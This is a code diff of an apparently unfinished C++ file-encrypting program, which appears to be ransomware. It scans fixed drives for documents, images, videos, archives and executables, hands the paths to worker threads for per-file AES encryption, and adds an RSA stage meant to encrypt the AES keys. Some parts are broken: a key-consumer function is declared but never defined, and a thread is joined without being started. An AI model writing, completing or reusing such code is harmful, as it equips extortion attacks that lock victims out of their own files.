@@ -4,6 +4,9 @@
 #include <vector>
 #include <set>
 #include <fstream>
+#include <thread>
+#include <future>
+#include <chrono>
 
 #include <boost\filesystem.hpp>
 
@@ -16,13 +19,19 @@
 using namespace std;
 using namespace boost::filesystem;
 
-struct producer_bundle {
+struct p_producer_bundle {
 	moodycamel::ConcurrentQueue<wstring>& q;
 	moodycamel::ProducerToken& p;
 	atomic<int>& flag;
 };
 
-struct consumer_bundle {
+struct k_producer_bundle {
+	moodycamel::ConcurrentQueue<const unsigned char *>& q;
+	moodycamel::ProducerToken& p;
+	atomic<int>& flag;
+};
+
+struct p_consumer_bundle {
 	moodycamel::ConcurrentQueue<wstring>& q;
 	moodycamel::ProducerToken& p;
 	atomic<int>& prod_flag;
@@ -31,51 +40,70 @@ struct consumer_bundle {
 	const int& consumer_count;
 };
 
+struct k_consumer_bundle {
+	moodycamel::ConcurrentQueue<const unsigned char *>& q;
+	moodycamel::ProducerToken& p;
+	atomic<int>& prod_flag;
+	atomic<int>& cons_flag;
+	const int& producer_count;
+	const int& consumer_count;
+};
+
+
 set<wstring>* get_wanted_extentions();
 set<wstring>* get_ignore_folders();
 vector<wstring>* get_available_drives();
 
-void produce(producer_bundle& bundle);
-void consume(consumer_bundle& bundle, const int& consumer_id);
+void path_producer(p_producer_bundle& bundle);
+void path_consumer(p_consumer_bundle& c_bundle, k_producer_bundle&  p_bundle, const int& consumer_id);
+void key_consumer(k_consumer_bundle& bundle, const int& consumer_id);
 
 int main(int argc, char* argv[]) {
-	AESCrypto *aes = new AESCrypto();
-	unsigned char tag[16];
-	/*std::ifstream in_enc(L"C:\\test\\test.jpg", ios::binary);
-	std::ofstream out_enc(L"C:\\test\\test.enc", ios::binary);
+	moodycamel::ConcurrentQueue<wstring> path_queue;
+	moodycamel::ProducerToken path_prod_tok(path_queue);
+	moodycamel::ConcurrentQueue<const unsigned char *> key_queue;
+	moodycamel::ProducerToken key_prod_tok(key_queue);
 
-	std::ifstream in_dec(L"C:\\test\\test.enc", ios::binary);
-	std::ofstream out_dec(L"C:\\test\\testdec.jpg", ios::binary);
-	aes->encrypt(in_enc, out_enc, tag);
-	aes->decrypt(in_dec, out_dec, tag);*/
-	wstring path = L"C:\\test\\test.txt";
-	int encrypted_bytes = aes->in_place_encrypt(path, tag);
-	int decrypted_bytes = aes->in_place_decrypt(path, tag);
+	const int path_producer_count = 1;
+	const int path_consumer_count = 4;
+	const int key_encrypter_count = 1;
 
-	moodycamel::ConcurrentQueue<wstring> queue;
-	moodycamel::ProducerToken ptok(queue);
-	const int producer_count = 1;
-	const int consumer_count = 4;
-	thread producers[producer_count];
-	thread consumers[consumer_count];
+	thread path_producer;
+	thread path_consumers[path_consumer_count];
+	thread rsa_thread;
+
+	/* File path consumption pair */
 	atomic<int> doneProducer(0);
 	atomic<int> doneComsumer(0);
 
-	producer_bundle producer_bundle = {queue, ptok, doneProducer};
+	/* AES key RSA encyption pair */
+	atomic<int> doneProdEnc(0);
+	atomic<int> doneConsEnc(0);
+	RSACrypto rsa = RSACrypto();
 
-	producers[0] = thread(bind(&produce, ref(producer_bundle)));
+	/* Start path producer thread and fill queue */
+	p_producer_bundle path_producer_bundle = { path_queue, path_prod_tok, doneProducer };
+	path_producer = thread(bind(&path_producer, ref(path_producer_bundle)));
 
-	consumer_bundle consumer_bundle = { queue, ptok, doneProducer, doneComsumer, producer_count, consumer_count };
-	// Start consumer threads
-	for (int i = 0; i < consumer_count; ++i) {
-		consumers[i] = thread(bind(&consume, ref(consumer_bundle), i));
+	/* 
+	Start path consumer thread and empty path queue 
+	This thread also fills key_queue so we can encrypt aes keys with rsa
+	*/
+	p_consumer_bundle path_consumer_bundle = { path_queue, path_prod_tok, doneProducer, doneComsumer, path_producer_count, path_consumer_count };
+	k_producer_bundle key_producer_bundle = { key_queue , key_prod_tok, doneProdEnc };
+	for (int i = 0; i < path_consumer_count; ++i) {
+		path_consumers[i] = thread(bind(&path_consumer, ref(path_consumer_bundle), ref(key_producer_bundle), i));
+		//consumers[i] = async(launch::async, [&consumer_bundle, i]() {return consume(consumer_bundle, i);});	
 	}
 
-	producers[0].join();
 
-	for (int i = 0; i < consumer_count; ++i) {
-		consumers[i].join();
+
+	/* Have all threads join */
+	path_producer.join();
+	for (int i = 0; i < path_consumer_count; ++i) {
+		path_consumers[i].join();
 	}
+	rsa_thread.join();
 
 	system("pause");
 	return 0;
@@ -83,19 +111,19 @@ int main(int argc, char* argv[]) {
 
 set<wstring>* get_wanted_extentions() {
 	set<wstring>* extentions = new set<wstring>();
-
+	// Text
 	extentions->insert(L".pdf");
 	extentions->insert(L".doc");
 	extentions->insert(L".docx");
 	extentions->insert(L".txt");
 	extentions->insert(L".xls");
 	extentions->insert(L".csv");
-
+	// Images 
 	extentions->insert(L".jpg");
 	extentions->insert(L".jpeg");
 	extentions->insert(L".png");
 	extentions->insert(L".gif");
-
+	// Video
 	extentions->insert(L".webm");
 	extentions->insert(L".mkv");
 	extentions->insert(L".avi");
@@ -104,13 +132,13 @@ set<wstring>* get_wanted_extentions() {
 	extentions->insert(L".wmv");
 	extentions->insert(L".mpg");
 	extentions->insert(L".mpeg");
-
+	// Compressed
 	extentions->insert(L".tar");
 	extentions->insert(L".gz");
 	extentions->insert(L".zip");
 	extentions->insert(L".7z");
 	extentions->insert(L".rar");
-
+	// Executables
 	extentions->insert(L".exe");
 	extentions->insert(L".msi");
 	extentions->insert(L".bin");
@@ -123,7 +151,7 @@ vector<wstring>* get_available_drives() {
 
 	vector<wstring>* drives = new vector<wstring>();
 
-	WCHAR myDrives[105];
+	WCHAR myDrives[512];
 	UINT driveType;
 
 	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
@@ -138,7 +166,7 @@ vector<wstring>* get_available_drives() {
 		{
 			driveType = GetDriveTypeW(drive);
 			wprintf(L"Drive %s is type %d \n", drive, driveType);
-
+			// Only deal with local drives
 			if (driveType == DRIVE_FIXED) {
 				wstring drive_string(drive);
 				drives->push_back(drive_string);
@@ -161,9 +189,7 @@ set<wstring>* get_ignore_folders() {
 	return ignore_folders;
 }
 
-void produce(producer_bundle& bundle) {
-	//cout << "PRODUCER 1 - Started" << endl;
-
+void path_producer(p_producer_bundle& bundle) {
 	set<wstring>* ignore_folders = get_ignore_folders();
 	set<wstring>* wanted_extentions = get_wanted_extentions();
 	vector<wstring>* drives = get_available_drives();
@@ -172,18 +198,13 @@ void produce(producer_bundle& bundle) {
 	moodycamel::ProducerToken& ptok = bundle.p;
 	atomic<int>& flag = bundle.flag;
 
-	/*cout << "Looking for files to encrypt with the following extentions:" << endl;
-	for (wstring s : *wanted_extentions) {
-		wcout << L"\t- " << s << endl;
-	}*/
-
 	// Testing
 	drives = new vector<wstring>();
 	drives->push_back(L"C:\\test");
 
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
-		
+
 		recursive_directory_iterator dir(drive), end;
 		while (dir != end) {
 			try
@@ -221,25 +242,29 @@ void produce(producer_bundle& bundle) {
 	flag.fetch_add(1, memory_order_release);
 }
 
-void consume(consumer_bundle& bundle, const int& consumer_id) {
-	//cout << "CONSUMER " << consumer_id << " - Started" << endl;
-	moodycamel::ConcurrentQueue<wstring>& queue = bundle.q;
-	moodycamel::ProducerToken& ptok = bundle.p;
+void path_consumer(p_consumer_bundle& p_bundle, k_producer_bundle& k_bundle, const int& consumer_id) {
+	/* Unpack path consumer bundle */
+	moodycamel::ConcurrentQueue<wstring>& p_queue = p_bundle.q;
+	moodycamel::ProducerToken& p_ptok = p_bundle.p;
+	atomic<int>& p_doneProducer = p_bundle.prod_flag;
+	atomic<int>& p_doneConsumer = p_bundle.cons_flag;
+	const int& p_producer_count = p_bundle.producer_count;
+	const int& p_consumer_count = p_bundle.consumer_count;
 
-	atomic<int>& doneProducer = bundle.prod_flag;
-	atomic<int>& doneConsumer = bundle.cons_flag;
+	/* Unpack key producer bundle */
+	moodycamel::ConcurrentQueue<const unsigned char *>& k_queue = k_bundle.q;
+	moodycamel::ProducerToken& k_ptok = k_bundle.p;
+	atomic<int>& k_doneProducer = k_bundle.flag;
 
-	const int& producer_count = bundle.producer_count;
-	const int& consumer_count = bundle.consumer_count;
-
-	// Consume paths from producer thread for encryption
 	wstring path_str;
 	bool items_left;
 	do {
-		items_left = doneProducer.load(memory_order_acquire) != producer_count;
-		while (queue.try_dequeue_from_producer(ptok, path_str)) {
+		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
+		while (p_queue.try_dequeue_from_producer(p_ptok, path_str)) {
 			items_left = true;
-			wprintf(L"CONSUMER %d - Consuming %s \n",consumer_id,  &path_str[0]);
+			wprintf(L"CONSUMER %d - Consuming %s \n", consumer_id, &path_str[0]);
+
+			AESCrypto aes = AESCrypto();
 		}
-	} while (items_left || doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == consumer_count);
+	} while (items_left || p_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == p_consumer_count);
 }
